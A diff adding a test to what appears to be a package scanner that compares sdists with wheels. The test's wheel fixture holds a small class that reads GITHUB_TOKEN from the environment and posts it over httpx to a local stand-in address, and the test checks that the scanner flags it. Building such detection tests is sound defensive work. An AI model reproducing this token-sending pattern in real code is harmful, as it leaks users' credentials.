@@ -472,6 +472,27 @@ def test_wheel_only_credential_network_flow_is_denied(make_sdist, make_wheel) ->
     assert any(item.source and item.sink == "requests.post" for item in findings)
 
 
+def test_wheel_only_class_client_credential_network_flow_is_denied(make_sdist, make_wheel) -> None:
+    sdist = make_sdist({"demo/__init__.py": ""})
+    wheel = make_wheel(
+        {
+            "demo/__init__.py": "",
+            "demo/update.py": (
+                "import httpx\nimport os\n"
+                "class Api:\n"
+                "    def __init__(self):\n"
+                "        self.client = httpx.Client()\n"
+                "    def send(self):\n"
+                "        secret = os.getenv('GITHUB_TOKEN')\n"
+                "        self.client.post('http://127.0.0.1:1/', data=secret)\n"
+            ),
+        }
+    )
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    assert "wheel_only_credential_network" in _rules(findings)
+    assert any(item.source and item.sink == "httpx.Client.post" for item in findings)
+
+
 def test_wheel_only_executable_pth_is_denied(make_sdist, make_wheel) -> None:
     sdist = make_sdist({"demo/__init__.py": ""})
     wheel = make_wheel(
